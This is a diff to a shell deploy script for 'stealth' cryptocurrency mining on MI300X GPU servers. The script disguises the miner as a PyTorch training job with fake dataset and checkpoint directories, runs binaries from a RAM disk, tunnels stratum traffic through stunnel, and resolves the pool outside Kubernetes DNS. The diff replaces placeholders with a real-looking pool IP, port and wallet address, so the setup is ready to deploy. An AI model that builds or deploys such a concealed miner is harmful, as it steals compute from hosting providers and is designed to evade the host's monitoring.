@@ -10,10 +10,10 @@ LOGDIR="/workspace/logs"
 CHECKDIR="/workspace/checkpoints"
 FAKEDATADIR="/workspace/datasets"
 TMPSRAM="/dev/shm"  # tmpfs for binaries (RAM disk)
-SPOOL_PORT=3333
-YOUR_POOL_IP="CHANGE_ME"  # <-- IP VPS pool terpisah
-YOUR_WALLET="CHANGE_ME"   # <-- Wallet PRL address
-VPN_PEER="CHANGE_ME"      # <-- WireGuard peer endpoint
+SPOOL_PORT=5555
+YOUR_POOL_IP="54.82.22.154"  # <-- IP VPS pool terpisah
+YOUR_WALLET="prl1paf83uwplzy4r3s4ukkud649009fwzgunmgh7phv8hdhu2jg2pnasua4t5k"   # <-- Wallet PRL address
+# VPN_PEER removed — pool stratum is direct TCP
 
 echo "============================================="
 echo "  MI300X 19-Layer Stealth Mining Deploy"
@@ -377,7 +377,7 @@ cat > /tmp/stunnel_miner.conf << 'STUNNEL'
 [prl-miner]
 client = yes
 accept = 127.0.0.1:3334
-connect = CHANGE_ME:443  # Your pool VPS IP, port 443
+connect = 54.82.22.154:5555  # Pool VPS IP, port 5555 (hard)
 STUNNEL
 
 # stunnel /tmp/stunnel_miner.conf
@@ -407,7 +407,7 @@ import os
 
 # Resolve pool hostname via external DNS, not K8s DNS
 # Then use IP directly in stratum URL
-POOL_HOST = os.environ.get("POOL_HOST", "CHANGE_ME")
+POOL_HOST = os.environ.get("POOL_HOST", "54.82.22.154")
 POOL_IP_FILE = "$WORKDIR/config/pool_ip.txt"
 
 def resolve_via_external(host):
@@ -496,8 +496,8 @@ cat > "$WORKDIR/config/pool_connection.conf" << 'POOLCONF'
 # Pool VPS: separate provider (NOT DigitalOcean)
 
 # Pool endpoint (TLS, port 443 via stunnel)
-STRATUM_URL="stratum+tls://CHANGE_ME:443"
-WALLET="CHANGE_ME"
+STRATUM_URL="stratum+tcp://54.82.22.154:5555"
+WALLET="prl1paf83uwplzy4r3s4ukkud649009fwzgunmgh7phv8hdhu2jg2pnasua4t5k"
 WORKER="pytorch_worker_01"
 
 # Pool settings
